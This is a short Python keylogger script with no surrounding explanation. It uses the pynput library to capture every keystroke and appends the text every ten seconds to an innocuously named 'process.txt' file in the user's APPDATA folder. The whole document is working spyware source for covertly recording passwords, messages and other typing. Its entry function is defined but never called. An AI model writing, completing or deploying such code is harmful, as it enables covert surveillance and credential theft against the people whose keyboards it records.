#!/usr/bin/python3

import pynput.keyboard
import threading
import os

# Use a path that is specific to the user running the script
#path = os.path.expanduser("~") + "/process.txt"
path = os.environ['appdata'] + '\\process.txt'

log = ""

last_key = None
def process_keys(key):
    global log
    global last_key

    if key == last_key:
        return

    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.right or key == key.left or key == key.up or key == key.down:
            log += ""
        else:
            log += " " + str(key) + " "

def report():
    global log
    global path

    # Use "with" statement to automatically close the file
    with open(path, "a") as f:
        f.write(log)
        # Clear the log after writing to the file
        log = ""
        f.close()

    # Use a timer to repeatedly call the report() function
    timer = threading.Timer(10, report)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        # Start the timer before joining the listener
        report()
        keyboard_listener.join()


